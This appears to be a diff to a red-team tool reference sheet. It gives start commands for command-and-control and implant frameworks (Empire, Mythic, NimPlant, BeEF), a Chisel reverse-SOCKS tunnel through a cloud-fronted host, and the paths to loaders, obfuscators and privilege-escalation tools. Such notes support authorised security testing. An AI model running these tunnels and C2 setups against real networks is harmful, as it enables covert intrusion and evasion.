@@ -1,14 +1,22 @@
 Tool Reference
 
+Note: all are example usages. You're encouraged to learn their intent and customise this for your requirements.
+
 BeEF:
 - Start: docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 -d --name beef beef
 - Reference: https://github.com/beefproject/beef  
 
+Chisel:
+- Start server: cd /opt/Chisel && ./chisel_linux_amd64 server -p 8080 --key "private" --auth "user:pass" --reverse --proxy "https://www.google.com"
+- Start client: chisel.exe client --auth user:pass https://d15i3ejqu7j95x.cloudfront.net R:1080:socks
+- Reference: https://github.com/jpillora/chisel
+
 Empire:
-- Start server: cd /opt/Empire && ./ps-empire server
-- Start client: cd /opt/Empire && ./ps-empire client
+- Start server: docker run -it -p 1337:1337 -p 5000:5000 --volumes-from data bcsecurity/empire:latest
+- Container ID: docker container ls
+- Start client: docker exec -it {container-id} ./ps-empire client
 - References:  
-  - https://github.com/BC-SECURITY/Empire  
+- https://bc-security.gitbook.io/empire-wiki
 
 Exploit DB:
 - Search: cd /opt/exploit-db && ./searchsploit  
@@ -36,6 +44,11 @@ Mythic:
 - Get Password: ./mythic-cli config get MYTHIC_ADMIN_PASSWORD  
 - Reference: https://github.com/its-a-feature/Mythic  
 
+NimPlant:
+- Start: cd /opt/NimPlant && python3 NimPlant.py server  
+- Compile Implants: python3 NimPlant.py compile all  
+- Reference: https://github.com/chvancooten/NimPlant  
+
 Prelude Operator:
 - Start: cd /opt/Operator && ./prelude-operator  
 - Reference: https://www.prelude.org/  
@@ -49,5 +62,9 @@ SpiderFoot:
 - Reference: https://github.com/smicallef/spiderfoot  
 
 Others:
-- Loaders can be found in /opt/Loaders, Payload tools in /opt/Payloads and Obfuscators in /opt/Obfuscators  
-- Tools intended to be used on the target (e.g. Mimikatz, Ncat, WSO) can be found in categorised folders under /var/www/html
+- Loaders: /opt/Tools/Loaders  
+- Obfuscators: /opt/Tools/Obfuscators  
+- Payload Generation: /opt/Tools/Payloads  
+- Privilege Escalation: /opt/Tools/Privesc  
+- Recon: /opt/Tools/Recon  
+- Utilities: /opt/Tools/Util  
